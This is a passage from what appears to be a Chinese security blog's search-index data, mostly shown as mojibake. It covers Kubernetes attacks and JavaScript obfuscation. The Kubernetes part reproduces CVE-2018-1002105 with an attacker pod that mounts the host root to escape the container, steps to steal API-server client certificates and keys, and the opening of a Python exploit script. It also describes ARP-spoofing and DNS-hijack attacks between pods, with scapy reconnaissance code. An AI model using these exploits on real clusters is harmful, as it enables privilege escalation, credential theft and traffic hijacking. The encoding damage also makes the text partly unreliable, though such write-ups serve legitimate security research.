serviceAccount: default serviceAccountName: default test-csvï¼Œç”¨æˆ· test çš„è®¤è¯å‡­è¯ã€‚Token, ç”¨æˆ·å, UID, ç”¨æˆ·ç»„ password,test,test,test åˆ†åˆ«åº”ç”¨ä¸Šè¿° yamlï¼škubectl apply -f xxx é…ç½®ç”¨æˆ·è®¤è¯ï¼š cp test-csv.csv /etc/kubernetes/pki/test-role-token.csv ä¿®æ”¹ API Server é…ç½®æ–‡ä»¶ /etc/kubernetes/manifests/kube-apiserver.yaml æœ€åçš„ç»“æœï¼š æ£€æµ‹æ˜¯å¦éƒ¨ç½²æˆåŠŸï¼š kubectl --token=password --server=https://129.226.12.58:6443 --insecure-skip-tls-verify exec -it test -n vul /bin/hostname kubectl --token=password --server=https://129.226.12.58:6443 --insecure-skip-tls-verify get pods -n kube-system 3.3.3 æ¼æ´å¤ç° ç›®æ ‡ï¼šé€šè¿‡è¯¥æ¼æ´ï¼Œè¿›è¡Œææƒï¼Œåˆ›å»ºä¸€ä¸ªæŒ‚è½½ä¸»æœºæ ¹ç›®å½•çš„ Podï¼Œå®ç°å®¹å™¨é€ƒé€¸ã€‚ # attacker.yaml apiVersion: v1 kind: Pod metadata: name: attacker spec: containers: - name: ubuntu image: ubuntu:latest imagePullPolicy: IfNotPresent # Just spin \u0026 wait forever command: [ \"/bin/bash\", \"-c\", \"--\" ] args: [ \"while true; do sleep 30; done;\" ] volumeMounts: - name: escape-host mountPath: /host-escape-door volumes: - name: escape-host hostPath: path: / æ€è·¯ï¼š æ„é€ é”™è¯¯è¯·æ±‚ï¼Œå»ºç«‹ç» Kubernetes API Server ä»£ç†åˆ° Kubelet çš„é«˜æƒé™ WebSocket è¿æ¥ã€‚ åˆ©ç”¨é«˜æƒé™ Websocket è¿æ¥ï¼Œå‘ Kubelet å‘èµ· /runningpods/ è¯·æ±‚ï¼Œè·å¾—å½“å‰æ´»åŠ¨ Pod åˆ—è¡¨ã€‚ ä»æ´»åŠ¨ Pod åˆ—è¡¨ä¸­æ‰¾åˆ° Kuberetes API Server çš„ Pod åç§°ã€‚ åˆ©ç”¨é«˜æƒé™ WebSocket è¿æ¥ï¼Œå‘ Kubelet å‘èµ· /exec è¯·æ±‚ï¼ŒæŒ‡å®š Pod ä¸ºä¸Šä¸€æ­¥ä¸­è·å¾—çš„ Pod åç§°ï¼Œæºå¸¦â€œåˆ©ç”¨ cat å‘½ä»¤è¯»å– ca.crtâ€ä½œä¸ºå‚æ•°ï¼Œä»è¿”å›ç»“æœä¸­ä¿å­˜çªƒå–åˆ°çš„æ–‡ä»¶ã€‚ åˆ©ç”¨é«˜æƒé™ WebSocket è¿æ¥ï¼Œå‘ Kubelet å‘èµ· /exec è¯·æ±‚ï¼ŒæŒ‡å®š Pod ä¸ºä¸Šä¸€æ­¥ä¸­è·å¾—çš„ Pod åç§°ï¼Œæºå¸¦â€œåˆ©ç”¨ cat å‘½ä»¤è¯»å– apiserver-kubelet-client.crt â€ä½œä¸ºå‚æ•°ï¼Œä»è¿”å›ç»“æœä¸­ä¿å­˜çªƒå–åˆ°çš„æ–‡ä»¶ã€‚ åˆ©ç”¨é«˜æƒé™ WebSocket è¿æ¥ï¼Œå‘ Kubelet å‘èµ· /exec è¯·æ±‚ï¼ŒæŒ‡å®š Pod ä¸ºä¸Šä¸€æ­¥ä¸­è·å¾—çš„ Pod åç§°ï¼Œæºå¸¦â€œåˆ©ç”¨ cat å‘½ä»¤è¯»å– apiserver-kubelet-client.keyâ€ä½œä¸ºå‚æ•°ï¼Œä»è¿”å›ç»“æœä¸­ä¿å­˜çªƒå–åˆ°çš„æ–‡ä»¶ ä½¿ç”¨ kubectl å‘½ä»¤è¡Œå·¥å…·ï¼ŒæŒ‡å®šè®¿é—®å‡­è¯ä¸ºç¬¬ 4ã€5ã€6 æ­¥ä¸­çªƒå–åˆ°çš„æ–‡ä»¶ï¼Œåˆ›å»ºæŒ‚è½½äº†å®¿ä¸»æœºæ ¹ç›®å½•çš„ Podï¼Œå®ç°å®¹å™¨é€ƒé€¸ã€‚ EXP å¦‚ä¸‹ï¼š \"\"\"ExP for CVE-2018-1002105 ONLY USED FOR SECURITY RESEARCH ILLEGAL USE IS **PROHIBITED** \"\"\" from secrets import base64, token_bytes import sys import argparse import socket import ssl from urllib import parse import json try: from http_parser.parser import HttpParser except ImportError: from http_parser.pyparser import HttpParser context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH) # Args parser = argparse.ArgumentParser(description='ExP for CVE-2018-1002105.') required = parser.add_argument_group('required arguments') required.add_argument('--target', '-t', dest='host', type=str, help='API Server\\'s IP', required=True) required.add_argument('--port', '-p', dest='port', type=str, help='API Server\\'s port', required=True) required.add_argument('--bearer-token', '-b', dest='token', type=str, help='Bearer token for the low privileged user', required=True) required.add_argument('--namespace', '-n', dest='namespace', type=str, help='Namespace","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/:3:3","tags":["äº‘åŸç”Ÿå®‰å…¨","k8s"],"title":"K8s å®‰å…¨","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"4 k8s ä¸­é—´äººæ”»å‡» Flannel æ˜¯ CoreOS å›¢é˜Ÿé’ˆå¯¹ Kubernetes è®¾è®¡çš„ä¸€ä¸ªç½‘ç»œè§„åˆ’æœåŠ¡ï¼Œç®€å•æ¥è¯´ï¼Œå®ƒçš„åŠŸèƒ½æ˜¯è®©é›†ç¾¤ä¸­çš„ä¸åŒèŠ‚ç‚¹ä¸»æœºåˆ›å»ºçš„ Docker å®¹å™¨éƒ½å…·æœ‰å…¨é›†ç¾¤å”¯ä¸€çš„è™šæ‹Ÿ IP åœ°å€ã€‚ ","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/:4:0","tags":["äº‘åŸç”Ÿå®‰å…¨","k8s"],"title":"K8s å®‰å…¨","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"4.1 èƒŒæ™¯ åœ¨é»˜è®¤çš„ Docker é…ç½®ä¸­ï¼Œæ¯ä¸ªèŠ‚ç‚¹ä¸Šçš„ Docker æœåŠ¡ä¼šåˆ†åˆ«è´Ÿè´£æ‰€åœ¨èŠ‚ç‚¹å®¹å™¨çš„ IP åˆ†é…ã€‚è¿™æ ·å¯¼è‡´çš„ä¸€ä¸ªé—®é¢˜æ˜¯ï¼Œä¸åŒèŠ‚ç‚¹ä¸Šå®¹å™¨å¯èƒ½è·å¾—ç›¸åŒçš„å†…å¤– IP åœ°å€ã€‚ Flannel çš„è®¾è®¡ç›®çš„å°±æ˜¯ä¸ºé›†ç¾¤ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹é‡æ–°è§„åˆ’ IP åœ°å€çš„ä½¿ç”¨è§„åˆ™ï¼Œä»è€Œä½¿å¾—ä¸åŒèŠ‚ç‚¹ä¸Šçš„å®¹å™¨èƒ½å¤Ÿè·å¾—åŒå±ä¸€ä¸ªå†…ç½‘ä¸”ä¸é‡å¤çš„ IP åœ°å€ï¼Œå¹¶è®©å±äºä¸åŒèŠ‚ç‚¹ä¸Šçš„å®¹å™¨èƒ½å¤Ÿç›´æ¥é€šè¿‡å†…ç½‘ IP é€šä¿¡ã€‚ ä»¥ Flannel ä½œä¸ºé›†ç¾¤ç½‘ç»œæŸ¥ä»¶æ—¶ï¼Œéƒ¨ç½² k8s é›†ç¾¤çš„ç½‘ç»œæ¶æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š æ¯ä¸ªèŠ‚ç‚¹ä¸Šä¼šåˆ›å»ºä¸€ä¸ªCNI ç½‘æ¡¥ï¼ˆé»˜è®¤è®¾å¤‡åç§°ä¸º cni0ï¼‰ã€‚æ¯ä¸ª Pod å­˜åœ¨åŸŸè‡ªå·±çš„ç½‘ç»œå‘½åç©ºé—´ä¸­ï¼Œé€šè¿‡è™šæ‹Ÿç½‘å¡å¯¹ Veth pair è®¾å¤‡ä¸å¤–ç•Œé€šä¿¡ã€‚ Veth pair è®¾å¤‡å°†åˆ›å»ºä¸¤å¼ è™šæ‹Ÿç½‘å¡ï¼Œåˆ†åˆ«ä½äº Pod æ‰€åœ¨çš„ç½‘ç»œå‘½åç©ºé—´ä¸­å’ŒèŠ‚ç‚¹æ ¹ç½‘ç»œå‘½åç©ºé—´ä¸­ï¼Œäº’ä¸ºå¯¹ç«¯ï¼ˆVeth peer)ï¼Œå¯¹äº Veth pair è®¾å¤‡çš„ä¸¤å¼ è™šæ‹Ÿç½‘å¡æ¥è¯´ï¼Œä»å…¶ä¸­ä¸€å¼ ç½‘å¡å‘å‡ºçš„æ•°æ®åŒ…ï¼Œå°†ç›´æ¥å‡ºç°åœ¨å¦ä¸€å¼ ç½‘å¡ä¸Šã€‚ æ¯ä¸ªPod çš„ eth0 ç½‘å¡çš„å¯¹ç«¯ veth ç½‘å¡â€œæ’â€åœ¨ cni0 ç½‘æ¡¥ä¸Šã€‚åŒä¸€èŠ‚ç‚¹ä¸Šçš„å„ pod å¯ä»¥å€ŸåŠ© cni0 ç½‘æ¡¥äº’ç›¸é€šä¿¡ï¼Œä¸åŒèŠ‚ç‚¹ä¹‹é—´éœ€è¦å€ŸåŠ©é¢å¤–çš„ç½‘ç»œæ’ä»¶è¿›è¡Œé€šä¿¡ã€‚ CoreDNS æ˜¯æ•´ä¸ª Kubernetes é›†ç¾¤çš„ DNS æœåŠ¡å™¨ã€‚ è¿™æ ·çš„ç½‘ç»œä¼šå­˜åœ¨å“ªäº›å®‰å…¨é—®é¢˜å‘¢ï¼Ÿ æ‰€æœ‰è¿™æ­¤ Pod ä¼¼ä¹ç»„æˆäº†ä¸€ä¸ªå°å‹çš„å±€åŸŸç½‘ç»œï¼Œè¿™ä¸ªç½‘ç»œä¸­å¯èƒ½å­˜åœ¨ä¸­é—´äººæ”»å‡»ã€‚åœ¨é»˜è®¤é…ç½®ä¸‹çš„ Kubernetes é›†ç¾¤ä¸­ï¼Œå‡å¦‚æ”»å‡»è€…å€ŸåŠ© Webæ¸—é€ç­‰æ–¹å¼æ”»ç ´äº†æŸä¸ªPodï¼Œå°±æœ‰å¯èƒ½é’ˆå¯¹é›†ç¾¤å†…çš„å…¶å®ƒ Pod å‘èµ·ä¸­é—´äººæ”»å‡»ï¼Œç”šè‡³å¯ä»¥åŸºäºæ­¤å®ç° DNS åŠ«æŒã€‚ æ”»å‡»è€…æ”»ç ´ Web App Pod ä¹‹åï¼Œè·å¾—å®¹å™¨å†…éƒ¨çš„ root æƒé™ï¼Œé€šè¿‡ ARP æ¬ºéª—è¯±å¯¼å¦ä¸€ä¸ªPod ï¼Œè®©å…¶ä»¥ä¸º Web App Pod æ˜¯é›†ç¾¤çš„ DNS æœåŠ¡å™¨ï¼Œè¿›è€Œä½¿å¾— Backend pod åœ¨å¯¹å¤–å‘èµ·é’ˆå¯¹æŸåŸŸåï¼ˆå¦‚ example.comï¼‰çš„ HTTP è¯·æ±‚æ—¶é¦–å…ˆå‘ Web App Pod å‘èµ· DNS æŸ¥è¯¢è¯·æ±‚ã€‚ æ”»å‡»è€…åœ¨ Web App Pod å†…éƒ¨è®¾ç½®çš„æ¶æ„ DNS æœåŠ¡å™¨æ”¶åˆ°æŸ¥è¯¢è¯·æ±‚åè¿”å›äº†è‡ªå·±çš„ IP åœ°å€ï¼ŒBackend Pod å› æ­¤ä»¥ä¸º example.com åŸŸåçš„ IP åœ°å€æ˜¯ Web App Pod çš„åœ°å€ï¼Œäºæ˜¯å‘ Web App Pod å‘èµ· HTTP è¯·æ±‚ã€‚ åœ¨æ”¶åˆ° HTTP è¯·æ±‚åï¼Œæ”»å¤è€…åœ¨ web App Pod å†…è®¾ç½®çš„æ¶æ„ HTTP æœåŠ¡å™¨è¿”å›æ¶æ„å“åº”ç»™ Backend Podã€‚è‡³æ­¤ï¼Œæ•´ä¸ªæ”»å‡»è¿‡ç¨‹ç»“æŸï¼ŒBaokend Pod ä»¥ä¸ºè‡ªå·±æ‹¿åˆ°äº†æ­£ç¡®çš„ä¿¡æ¯ï¼Œå…¶å®ä¸ç„¶ã€‚ ","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/:4:1","tags":["äº‘åŸç”Ÿå®‰å…¨","k8s"],"title":"K8s å®‰å…¨","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"4.2 åœºæ™¯ 4.2.1 MITM éœ€è¦çš„ç½‘ç»œæƒé™ ç»“åˆ Linux ç³»ç»Ÿ Capablities çŸ¥è¯†å¯çŸ¥ï¼Œè¦æƒ³è¿›è¡Œä¸­é—´äººæ”»å‡»ï¼Œå¦‚å‘é€ ARP åŒ…ï¼Œéœ€è¦å…·æœ‰ CAP_NET_RAW æƒé™ã€‚é‚£ä¹ˆï¼Œå®¹å™¨å†…éƒ¨çš„ root ç”¨æˆ·æ˜¯å¦å…·æœ‰è¯¥æƒé™å‘¢ï¼Ÿ å¯ä»¥çœ‹åˆ°ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒPod æ˜¯å…·æœ‰ CAP_NET_RAW æƒé™çš„ã€‚ 4.2.2 k8s ä¸ DNS é¦–å…ˆï¼Œk8s ä»¥æœåŠ¡èµ„æº kube-dns çš„å½¢å¼æä¾›é›†ç¾¤çº§åˆ«çš„ DNS æœåŠ¡ï¼š Kube-dns æœåŠ¡ä¾èµ–çš„æ˜¯é›†ç¾¤ä¸­ kube-system å‘½åç©ºé—´ä¸‹çš„ CoreDNS Podã€‚ åœ¨æ–°å»ºçš„ Pod å†…éƒ¨å¯ä»¥å‘ç° resolv.conf æ–‡ä»¶ä¸­è®°å½•çš„ DNS æœåŠ¡å™¨ IP åœ°å€ä¸º kube-dns æœåŠ¡çš„åœ°å€ï¼š å½“è¿™ä¸ª Pod å‘ kube-dns æœåŠ¡å‘èµ· DNS æŸ¥è¯¢è¯·æ±‚æ—¶ï¼ŒæŸ¥è¯¢è¯·æ±‚ç»è¿‡ iptablesï¼Œæœ€ç»ˆè¢«å‘é€åˆ°æœåŠ¡åç«¯çš„ Core DNS ä¸­ã€‚ 4.2.3 k8s ä¸ ARP å½“ Pod å‘å¤–å‘ ARP è¯·æ±‚æ—¶ï¼Œè¯¥è¯·æ±‚ä¼šè¢«ç½‘æ¡¥è½¬å‘ç»™å…¶å®ƒæ¥å£ï¼Œå› æ­¤ï¼Œå…¶å®ƒ Pod å°±èƒ½å¤Ÿæ”¶åˆ° ARP è¯·æ±‚ï¼Œå…¶ä¸­ç½‘å¡ MAC åœ°å€ä¸ ARP è¯·æ±‚ç›¸ç¬¦çš„ Pod å°±ä¼šå‘é€ ARP å“åº”ï¼Œè¿™å“åº”åŒæ ·ä¼šè¢«ç½‘æ¡¥è½¬å‘ç»™å‘é€ ARP Requests çš„ Podã€‚ ","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/:4:2","tags":["äº‘åŸç”Ÿå®‰å…¨","k8s"],"title":"K8s å®‰å…¨","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"4.3 åŸç† å‡è®¾æŸ Pod A éœ€è¦è®¿é—® example.comï¼Œé‚£ä¹ˆå®ƒé¦–å…ˆå¿…é¡»çŸ¥é“è¯¥åŸŸåå¯¹åº”çš„ IPï¼Œå› æ­¤ï¼Œå®ƒéœ€è¦å‘å‡ºä¸€ä¸ªDNS æŸ¥è¯¢è¯·æ±‚ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œpod A ä¼šå‘é›†ç¾¤ DNS æœåŠ¡ kube-dns å‘èµ·è¯·æ±‚ã€‚ DNS è¯·æ±‚å®é™…ä¸Šæ˜¯ä¸€ä¸ª UDP æŠ¥æ–‡ï¼Œåœ¨æˆ‘çš„ç¯å¢ƒä¸­ï¼Œkube-dns æœåŠ¡çš„ IP ä¸º 10.96.0.10ï¼Œè€Œ PodA çš„ IP ä¸º 192.168.166.134ã€‚ä¸¤è€…ä¸åœ¨åŒä¸€å­ç½‘ã€‚å› æ­¤ï¼Œè¯¥ UDP æŠ¥æ–‡ä¼šè¢« Pod A å‘é€ç»™é»˜è®¤ç½‘å…³ï¼Œä¹Ÿå°±æ˜¯ cni0ã€‚æ¥ç€ï¼ŒèŠ‚ç‚¹ iptables å¯¹è¯¥æŠ¥æ–‡è¿›è¡Œ DNAT å¤„ç†ï¼Œå°†ç›®çš„åœ°æ”¹ä¸º 192.168.219.77ï¼Œä¹Ÿå°±æ˜¯ CoreDNS Pod çš„ IP åœ°å€ã€‚ ç”±äº Pod A å¹¶æœªç›´æ¥å‘ 192.168.219.77 å‘å‡ºè¯·æ±‚ï¼Œä¸Šé¢çš„ ARP è§£æè¿‡ç¨‹æ˜¯ cni0 è´Ÿè´£çš„ã€‚å› æ­¤ï¼Œæ”»å‡»è€…åªéœ€è¦å¯¹ cni0 å‘èµ·æ¶æ„æ”»å‡»å³å¯ã€‚ ä½†æ”»å‡»è€…åœ¨ Pod å†…ï¼Œå¦‚ä½•è·å¾— cni0 ç½‘æ¡¥å’Œ CoreDNS Pod çš„ç½‘ç»œä¿¡æ¯å‘¢ï¼Ÿ é¦–å…ˆæ˜¯ cni0 ç½‘æ¡¥ã€‚ç½‘æ¡¥çš„ IP å’ŒMAC åœ°å€è·å–æ–¹å¼æ¯”è¾ƒå¤šæ ·ã€‚ä¾‹å¦‚ï¼Œç”±äº cnio æ—¢æ˜¯ç½‘æ¡¥åˆæ˜¯é»˜è®¤ç½‘å…³ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æŸ¥è¯¢ Pod çš„è·¯ç”±è¡¨ï¼Œè·å¾—ç½‘æ¡¥ IP åœ°å€ï¼š route -n ç„¶åç›´æ¥æŸ¥è¯¢ ARP ç¼“å­˜ï¼Œè·å¾—ç½‘æ¡¥ MAC åœ°å€ã€‚å¦‚æœæ²¡æœ‰ï¼Œå¯ä»¥å…ˆå‘ç½‘æ¡¥å‘é€ä¸€ä¸ª ARP è¯·æ±‚ï¼š arp -n å…¶æ¬¡æ˜¯ Core DNS Pod çš„ IP å’Œ MAC åœ°å€ã€‚ç»“åˆèƒŒæœ€çŸ¥è¯†éƒ¨åˆ† DNS å†…å®¹å¯çŸ¥ã€‚pod å†…éƒ¨ä»…ä»…èƒ½æ‹¿åˆ°ä¸€ä¸ªkube-dns æœåŠ¡çš„ IPï¼Œé€šå¸¸æ˜¯ 10.96.0.10ã€‚ä½†æ˜¯ï¼Œå¦‚æœæ”»å‡»è€… pod å‘è¯¥æœåŠ¡å‘é€ä¸€ä¸ª DNS æŸ¥è¯¢è¯·æ±‚ï¼Œå®é™…ä¸Šæ˜¯æœåŠ¡èƒŒåçš„ Core DNS Pod å›å¤ DNS å“åº”çš„ï¼ˆç»è¿‡ DNAT å¤„ç†ï¼Œç›®çš„åœ°æ”¹ä¸º CoreDNS Pod)ã€‚è€Œ DNS å“åº”åˆæ˜¯ä¸€ä¸ª UDP æŠ¥æ–‡ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä»ä¸­æå–åˆ° CoreDNS Pod çš„ MAC åœ°å€ã€‚ä½†æ˜¯ï¼ŒDNS å“åº”åˆä¼šè¢«è¿›è¡Œ SNAT å¤„ç†ï¼Œå…¶ä¸­çš„ IP åœ°å€è¢«é‡æ–°æ›¿æ¢ä¸º kube-dns æœåŠ¡ IP 10.96.0.10ã€‚æ‰€ä»¥ï¼Œä»¥ä¸Šæ­¥éª¤åªèƒ½è®©æ”»å‡»è€…æ‹¿åˆ° CoreDNS Pod çš„ MAC åœ°å€ã€‚ æ‰€ä»¥ï¼Œæ”»å‡»è€…å¯ä»¥å‘æ•´ä¸ªå­ç½‘çš„æ¯ä¸ª IP å‘å‡º ARP è¯·æ±‚ï¼Œæ”¶é›†å®ƒä»¬çš„ MAC åœ°å€ï¼Œç„¶åä¸å‰é¢è·å¾—çš„ CoreDNS Pod çš„ MAC åœ°å€è¿›è¡Œæ¯”å¯¹ï¼Œå¦‚æœä¸€è‡´ï¼Œåˆ™è¯´æ˜å¯¹åº” IP å³ä¸º CoreDNS Pod çš„ IPã€‚ ç›¸å…³ä»£ç å¦‚ä¸‹ï¼š def get_coredns_pod_mac_ip(kube_dns_svc_ip, self_ip, verbose): mac = srp1(Ether() / IP(dst=kube_dns_svc_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR()), verbose=verbose).src answers, _ = srp(Ether(dst=\"ff:ff:ff:ff:ff:ff\") / ARP(pdst=\"{}/24\".format(self_ip)), timeout=4, verbose=verbose) for answer in answers: if answer[1].src == mac: return mac, answer[1][ARP].psrc return None, None ","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/:4:3","tags":["äº‘åŸç”Ÿå®‰å…¨","k8s"],"title":"K8s å®‰å…¨","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"4.4 å¤ç° ä»£ç ï¼šäº‘åŸç”Ÿç½‘ç»œæ”»å‡» æ¨¡æ‹Ÿæ„å»ºæ”»å‡»è€…é•œåƒï¼š docker build -t k8s_dns_mitm:1.0 . ä½¿ç”¨ exploit.sh åˆ†åˆ«éƒ¨ç½² attacker å’Œ victim podï¼š ./exploit.sh ","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/:4:4","tags":["äº‘åŸç”Ÿå®‰å…¨","k8s"],"title":"K8s å®‰å…¨","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["ä»£ç å®¡è®¡"],"content":"JavaScript åæ··æ·†","date":"2021-11-18","objectID":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/","tags":["ä»£ç å®¡è®¡","JavaScript"],"title":"JavaScript åæ··æ·†","uri":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/"},{"categories":["ä»£ç å®¡è®¡"],"content":"JavaScript åæ··æ·† ","date":"2021-11-18","objectID":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/:0:0","tags":["ä»£ç å®¡è®¡","JavaScript"],"title":"JavaScript åæ··æ·†","uri":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1 å¸¸é‡çš„æ··æ·†åŸç† ","date":"2021-11-18","objectID":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/:1:0","tags":["ä»£ç å®¡è®¡","JavaScript"],"title":"JavaScript åæ··æ·†","uri":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1.1 å¯¹è±¡å±æ€§çš„ä¸¤ç§è®¿é—®æ–¹å¼ JavaScript ä¸­ï¼Œå¯¹è±¡è®¿é—®å±æ€§æœ‰ä¸¤ç§æ–¹å¼ã€‚ ç”¨ç‚¹è®¿é—® ç”¨æ‹¬å·è®¿é—® function People(name) { this.name = name; } People.prototype.sayHello = function () { console.log('Hello'); } var p = new People('pName'); console.log(p.name); //pName p.sayHello(); //Hello console.log(p['name']); //pName p['sayHello'](); //Hello ç”¨æ‹¬å·è®¿é—®çš„æ–¹å¼å¯ä»¥é’ˆå¯¹å…¶ä¸­çš„å­—ç¬¦ä¸²åšæ··æ·† ","date":"2021-11-18","objectID":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/:1:1","tags":["ä»£ç å®¡è®¡","JavaScript"],"title":"JavaScript åæ··æ·†","uri":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1.2 å¸¸è§çš„æ··æ·†æ–¹å¼ 1.2.1 åå…­è¿›åˆ¶å­—ç¬¦ä¸² ä»¥ä¸‹é¢è¿™æ®µä»£ç ä¸ºä¾‹ï¼š Date.prototype.format = function (formatStr) { var str = formatStr; var Week = ['æ—¥', 'ä¸€', 'äºŒ', 'ä¸‰', 'å››', 'äº”', 'å…­']; str = str.replace(/yyyy|YYYY/, this.getFullYear()); str = str.replace(/MM/, (this.getMonth() + 1) \u003e 9 ? (this.getMonth() + 1).toString() : '0' + (this.getMonth() + 1)); str = str.replace(/dd|DD/, this.getDate() \u003e 9 ? this.getDate().toString() : '0' + this.getDate()); return str; } console.log(new Date().format('yyyy-MM-dd')); é’ˆå¯¹ä»£ç ä¸­å‡ºç°çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥å°†å…¶è½¬æ¢ä¸º 16 è¿›åˆ¶ã€‚ Date.prototype.format = function (formatStr) { var str = formatStr; var Week = ['æ—¥', 'ä¸€', 'äºŒ', 'ä¸‰', 'å››', 'äº”', 'å…­']; str = str.replace(/yyyy|YYYY/, this.getFullYear()); str = str.replace(/MM/, (this.getMonth() + 1) \u003e 9 ? (this.getMonth() + 1).toString() : '0' + (this.getMonth() + 1)); str = str.replace(/dd|DD/, this.getDate() \u003e 9 ? this.getDate().toString() : '0' + this.getDate()); return str; } console.log(new Date().format('\\x79\\x79\\x79\\x79\\x2d\\x4d\\x4d\\x2d\\x64\\x64')); 1.2.2 unicode å­—ç¬¦ä¸² åœ¨ JS ä¸­ï¼Œå­—ç¬¦ä¸²é™¤äº†å¯ä»¥è¡¨ç¤ºæˆåå…­è¿›åˆ¶çš„å½¢å¼å¤–ï¼Œè¿˜æ”¯æŒ unicode ç¼–ç ã€‚ ä»¥ var Week = ['æ—¥', 'ä¸€', 'äºŒ', 'ä¸‰', 'å››', 'äº”', 'å…­']; ä¸ºä¾‹ï¼Œå¯ä»¥è½¬æ¢æˆï¼š var Week = ['\\u65e5', '\\u4e00', '\\u4e8c', '\\u4e09', '\\u56db', '\\u4e94', '\\u516d']; æ­¤å¤–ï¼ŒJS è§£æå™¨åŒæ ·æ”¯æŒ unicode ç¼–ç å‡ºç°åœ¨æ ‡è¯†ç¬¦ä¸­ï¼š Date.prototype.\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074 = function(formatStr) { var \\u0073\\u0074\\u0072 = \\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u0053\\u0074\\u0072; var Week = ['\\u65e5', '\\u4e00', '\\u4e8c', '\\u4e09', '\\u56db', '\\u4e94', '\\u516d']; str = str['replace'](/yyyy|YYYY/, this['getFullYear']()); str = str['replace'](/MM/, (this['getMonth']() + 1) \u003e 9 ? (this['getMonth']() + 1)['toString']() : '0' + (this['getMonth']() + 1)); str = str['replace'](/dd|DD/, this['getDate']() \u003e 9 ? this['getDate']()['toString']() : '0' + this['getDate']()); return str; } console.log( new \\u0077\\u0069\\u006e\\u0064\\u006f\\u0077['\\u0044\\u0061\\u0074\\u0065']()['format']('\\x79\\x79\\x79\\x79\\x2d\\x4d\\x4d\\x2d\\x64\\x64') ); 1.2.3 å­—ç¬¦ä¸²çš„ ASCII ç  ä¸ºäº†å®Œæˆå­—ç¬¦ä¸²çš„ ASCII ç æ··æ·†ï¼Œåœ¨è¿™é‡Œéœ€è¦ä½¿ç”¨ä¸¤ä¸ªå‡½æ•°ï¼Œä¸€ä¸ªæ˜¯ String å¯¹è±¡ä¸‹çš„ charCodeAt æ–¹æ³•ï¼Œå¦å¤–ä¸€ä¸ªæ˜¯ String ç±»ä¸‹çš„ fronCharCode æ–¹æ³•ï¼š console.log(\"G\".charCodeAt(0)); // 71 console.log(\"e\".charCodeAt(0)); // 101 console.log(String.fromCharCode(71, 101)); function stringToByte(str) { var byteArr = []; for (var i = 0; i \u003c str.length; i++) { byteArr.push(str.charCodeAt(i)); } return byteArr; } console.log(stringToByte('Geekby')); å°†ä»£ç è½¬æ¢æˆå­—ç¬¦ä¸²åï¼Œåˆ©ç”¨ eval å‡½æ•°å»æ‰§è¡Œï¼š Date.prototype.\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074 = function(formatStr) { var \\u0073\\u0074\\u0072 = \\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u0053\\u0074\\u0072; var Week = ['\\u65e5', '\\u4e00', '\\u4e8c', '\\u4e09', '\\u56db', '\\u4e94', '\\u516d']; eval(String.fromCharCode(115, 116, 114, 32, 61, 32, 115, 116, 114, 91, 39, 114, 101, 112, 108, 97, 99, 101, 39, 93, 40, 47, 121, 121, 121, 121, 124, 89, 89, 89, 89, 47, 44, 32, 116, 104, 105, 115, 91, 39, 103, 101, 116, 70, 117, 108, 108, 89, 101, 97, 114, 39, 93, 40, 41, 41, 59)); str = str['replace'](/MM/, (this['getMonth']() + 1) \u003e 9 ? (this['getMonth']() + 1)['toString']() : '0' + (this['getMonth']() + 1)); str = str['replace'](/dd|DD/, this['getDate']() \u003e 9 ? this['getDate']()['toString']() : '0' + this['getDate']()); return str; } console.log( new \\u0077\\u0069\\u006e\\u0064\\u006f\\u0077['\\u0044\\u0061\\u0074\\u0065']()[String.fromCharCode(102, 111, 114, 109, 97, 116)]('\\x79\\x79\\x79\\x79\\x2d\\x4d\\x4d\\x2d\\x64\\x64') ); //è¾“å‡ºç»“æœ 2020-07-04 1.2.4 å­—ç¬¦ä¸²å¸¸é‡ç¼–ç æˆ–åŠ å¯† å­—ç¬¦ä¸²å¸¸é‡ç¼–ç æˆ–åŠ å¯†çš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼Œå…ˆæŠŠå­—ç¬¦ä¸²ç¼–ç æˆ–åŠ 